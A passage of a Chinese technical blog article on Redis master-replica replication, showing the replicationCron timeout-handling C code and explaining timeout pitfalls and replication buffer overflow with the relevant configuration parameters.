class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n/* Replication cron function, called 1 time per second. */\r\nvoid replicationCron(void) {\r\n    static long long replication_cron_loops = 0;\r\n\r\n    /* Non blocking connection timeout? */\r\n    if (server.masterhost &amp;&amp;\r\n        (server.repl_state == REDIS_REPL_CONNECTING ||\r\n         slaveIsInHandshakeState()) &amp;&amp;\r\n         (time(NULL)-server.repl_transfer_lastio) &gt; server.repl_timeout)\r\n    {\r\n        redisLog(REDIS_WARNING,\"Timeout connecting to the MASTER...\");\r\n        undoConnectWithMaster();\r\n    }\r\n\r\n    /* Bulk transfer I/O timeout? */\r\n    if (server.masterhost &amp;&amp; server.repl_state == REDIS_REPL_TRANSFER &amp;&amp;\r\n        (time(NULL)-server.repl_transfer_lastio) &gt; server.repl_timeout)\r\n    {\r\n        redisLog(REDIS_WARNING,\"Timeout receiving bulk data from MASTER... If the problem persists try to set the 'repl-timeout' parameter in redis.conf to a larger value.\");\r\n        replicationAbortSyncTransfer();\r\n    }\r\n\r\n    /* Timed out master when we are an already connected slave? */\r\n    if (server.masterhost &amp;&amp; server.repl_state == REDIS_REPL_CONNECTED &amp;&amp;\r\n        (time(NULL)-server.master-&gt;lastinteraction) &gt; server.repl_timeout)\r\n    {\r\n        redisLog(REDIS_WARNING,\"MASTER timeout: no data nor PING received...\");\r\n        freeClient(server.master);\r\n    }\r\n\r\n    //此处省略无关代码……\r\n\r\n    /* Disconnect timedout slaves. */\r\n    if (listLength(server.slaves)) {\r\n        listIter li;\r\n        listNode *ln;\r\n        listRewind(server.slaves,&amp;li);\r\n        while((ln = listNext(&amp;li))) {\r\n            redisClient *slave = ln-&gt;value;\r\n            if (slave-&gt;replstate != REDIS_REPL_ONLINE) continue;\r\n            if (slave-&gt;flags &amp; REDIS_PRE_PSYNC) continue;\r\n            if ((server.unixtime - slave-&gt;repl_ack_time) &gt; server.repl_timeout)\r\n            {\r\n                redisLog(REDIS_WARNING, \"Disconnecting timedout slave: %s\",\r\n                    replicationGetSlaveName(slave));\r\n                freeClient(slave);\r\n            }\r\n        }\r\n    }\r\n\r\n    //此处省略无关代码……\r\n\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4ad3aaaab18812814627-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad3aaaab18812814627-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad3aaaab18812814627-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad3aaaab18812814627-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad3aaaab18812814627-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad3aaaab18812814627-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad3aaaab18812814627-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad3aaaab18812814627-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad3aaaab18812814627-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad3aaaab18812814627-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad3aaaab18812814627-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad3aaaab18812814627-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad3aaaab18812814627-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad3aaaab18812814627-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad3aaaab18812814627-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad3aaaab18812814627-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad3aaaab18812814627-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad3aaaab18812814627-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad3aaaab18812814627-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad3aaaab18812814627-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad3aaaab18812814627-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad3aaaab18812814627-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad3aaaab18812814627-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad3aaaab18812814627-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad3aaaab18812814627-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad3aaaab18812814627-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad3aaaab18812814627-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad3aaaab18812814627-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad3aaaab18812814627-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad3aaaab18812814627-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad3aaaab18812814627-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad3aaaab18812814627-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad3aaaab18812814627-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad3aaaab18812814627-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad3aaaab18812814627-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad3aaaab18812814627-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad3aaaab18812814627-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad3aaaab18812814627-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad3aaaab18812814627-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad3aaaab18812814627-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad3aaaab18812814627-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad3aaaab18812814627-42\">42</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad3aaaab18812814627-43\">43</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad3aaaab18812814627-44\">44</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad3aaaab18812814627-45\">45</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad3aaaab18812814627-46\">46</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad3aaaab18812814627-47\">47</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad3aaaab18812814627-48\">48</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad3aaaab18812814627-49\">49</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad3aaaab18812814627-50\">50</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad3aaaab18812814627-51\">51</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad3aaaab18812814627-52\">52</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad3aaaab18812814627-53\">53</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4ad3aaaab18812814627-1\"><span class=\"crayon-c\">/* Replication cron function, called 1 time per second. */</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad3aaaab18812814627-2\"><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">replicationCron</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">void</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad3aaaab18812814627-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">replication_cron_loops</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad3aaaab18812814627-4\"> </div><div class=\"crayon-line\" id=\"crayon-5b4ad3aaaab18812814627-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/* Non blocking connection timeout? */</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad3aaaab18812814627-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">masterhost</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad3aaaab18812814627-7\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">repl_state</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">REDIS_REPL_CONNECTING</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">||</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad3aaaab18812814627-8\"><span class=\"crayon-h\">         </span><span class=\"crayon-e\">slaveIsInHandshakeState</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad3aaaab18812814627-9\"><span class=\"crayon-h\">         </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">time</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">repl_transfer_lastio</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">repl_timeout</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad3aaaab18812814627-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad3aaaab18812814627-11\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">redisLog</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">REDIS_WARNING</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">\"Timeout connecting to the MASTER...\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad3aaaab18812814627-12\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">undoConnectWithMaster</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad3aaaab18812814627-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad3aaaab18812814627-14\"> </div><div class=\"crayon-line\" id=\"crayon-5b4ad3aaaab18812814627-15\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/* Bulk transfer I/O timeout? */</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad3aaaab18812814627-16\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">masterhost</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">repl_state</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">REDIS_REPL_TRANSFER</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad3aaaab18812814627-17\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">time</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">repl_transfer_lastio</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">repl_timeout</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad3aaaab18812814627-18\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad3aaaab18812814627-19\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">redisLog</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">REDIS_WARNING</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">\"Timeout receiving bulk data from MASTER... If the problem persists try to set the 'repl-timeout' parameter in redis.conf to a larger value.\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad3aaaab18812814627-20\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">replicationAbortSyncTransfer</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad3aaaab18812814627-21\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad3aaaab18812814627-22\"> </div><div class=\"crayon-line\" id=\"crayon-5b4ad3aaaab18812814627-23\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/* Timed out master when we are an already connected slave? */</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad3aaaab18812814627-24\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">masterhost</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">repl_state</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">REDIS_REPL_CONNECTED</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad3aaaab18812814627-25\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">time</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">master</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">lastinteraction</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">repl_timeout</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad3aaaab18812814627-26\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad3aaaab18812814627-27\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">redisLog</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">REDIS_WARNING</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">\"MASTER timeout: no data nor PING received...\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad3aaaab18812814627-28\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">freeClient</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">master</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad3aaaab18812814627-29\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad3aaaab18812814627-30\"> </div><div class=\"crayon-line\" id=\"crayon-5b4ad3aaaab18812814627-31\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">//此处省略无关代码……</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad3aaaab18812814627-32\"> </div><div class=\"crayon-line\" id=\"crayon-5b4ad3aaaab18812814627-33\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/* Disconnect timedout slaves. */</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad3aaaab18812814627-34\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">listLength</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">slaves</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad3aaaab18812814627-35\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">listIter </span><span class=\"crayon-v\">li</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad3aaaab18812814627-36\"><span class=\"crayon-h\">        </span><span class=\"crayon-e \">listNode *</span><span class=\"crayon-v\">ln</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad3aaaab18812814627-37\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">listRewind</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">slaves</span><span class=\"crayon-sy\">,</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">li</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad3aaaab18812814627-38\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">while</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">ln</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">listNext</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">li</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad3aaaab18812814627-39\"><span class=\"crayon-h\">            </span><span class=\"crayon-e \">redisClient *</span><span class=\"crayon-v\">slave</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ln</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">value</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad3aaaab18812814627-40\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">slave</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">replstate</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">REDIS_REPL_ONLINE</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">continue</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad3aaaab18812814627-41\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">slave</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">flags</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">REDIS_PRE_PSYNC</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">continue</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad3aaaab18812814627-42\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">unixtime</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">slave</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">repl_ack_time</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">server</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">repl_timeout</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad3aaaab18812814627-43\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad3aaaab18812814627-44\"><span class=\"crayon-h\">                </span><span class=\"crayon-e\">redisLog</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">REDIS_WARNING</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Disconnecting timedout slave: %s\"</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad3aaaab18812814627-45\"><span class=\"crayon-h\">                    </span><span class=\"crayon-e\">replicationGetSlaveName</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">slave</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad3aaaab18812814627-46\"><span class=\"crayon-h\">                </span><span class=\"crayon-e\">freeClient</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">slave</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad3aaaab18812814627-47\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad3aaaab18812814627-48\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad3aaaab18812814627-49\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad3aaaab18812814627-50\"> </div><div class=\"crayon-line\" id=\"crayon-5b4ad3aaaab18812814627-51\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">//此处省略无关代码……</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad3aaaab18812814627-52\"> </div><div class=\"crayon-line\" id=\"crayon-5b4ad3aaaab18812814627-53\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0099 seconds] -->\r\n\n</div>\n<p><strong>需要注意的坑</strong></p>\n<p>下面介绍与复制阶段连接超时有关的一些实际问题：</p>\n<p>（1）数据同步阶段：在主从节点进行全量复制bgsave时，主节点需要首先fork子进程将当前数据保存到RDB文件中，然后再将RDB文件通过网络传输到从节点。如果RDB文件过大，主节点在fork子进程+保存RDB文件时耗时过多，可能会导致从节点长时间收不到数据而触发超时；此时从节点会重连主节点，然后再次全量复制，再次超时，再次重连……这是个悲伤的循环。为了避免这种情况的发生，除了注意Redis单机数据量不要过大，另一方面就是适当增大repl-timeout值，具体的大小可以根据bgsave耗时来调整。</p>\n<p>（2）命令传播阶段：如前所述，在该阶段主节点会向从节点发送PING命令，频率由repl-ping-slave-period控制；该参数应明显小于repl-timeout值(后者至少是前者的几倍)。否则，如果两个参数相等或接近，网络抖动导致个别PING命令丢失，此时恰巧主节点也没有向从节点发送数据，则从节点很容易判断超时。</p>\n<p>（3）慢查询导致的阻塞：如果主节点或从节点执行了一些慢查询（如keys *或者对大数据的hgetall等），导致服务器阻塞；阻塞期间无法响应复制连接中对方节点的请求，可能导致复制超时。</p>\n<h2>3. 复制中断问题</h2>\n<p>主从节点超时是复制中断的原因之一，除此之外，还有其他情况可能导致复制中断，其中最主要的是复制缓冲区溢出问题。</p>\n<h3>复制缓冲区溢出</h3>\n<p>前面曾提到过，在全量复制阶段，主节点会将执行的写命令放到复制缓冲区中，该缓冲区存放的数据包括了以下几个时间段内主节点执行的写命令：bgsave生成RDB文件、RDB文件由主节点发往从节点、从节点清空老数据并载入RDB文件中的数据。当主节点数据量较大，或者主从节点之间网络延迟较大时，可能导致该缓冲区的大小超过了限制，此时主节点会断开与从节点之间的连接；这种情况可能引起全量复制-&gt;复制缓冲区溢出导致连接中断-&gt;重连-&gt;全量复制-&gt;复制缓冲区溢出导致连接中断……的循环。</p>\n<p>复制缓冲区的大小由client-output-buffer-limit slave {hard limit} {soft limit} {soft seconds}配置，默认值为client-output-buffer-limit slave 256MB 64MB 60，其含义是：如果buffer大于256MB，或者连续60s大于64MB，则主节点会断开与该从节点的连接。该参数是可以通过config set命令动态配置的（即不重启Redis也可以生效）。</p>\n<p>当复制缓冲区溢出时，主节点打印日志如下所示：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/5a5a3405eca809876a29206e7e1e8d87.png\" alt=\"\"></p>\n<p><strong>需要注意的是，复制缓冲区是客户端输出缓冲区的一种，主节点会为每一个从节点分别分配复制缓冲区；而复制积压缓冲区则是一个主节点只有一个，无论它有多少个从节点。</strong></p>\n<h2>4. 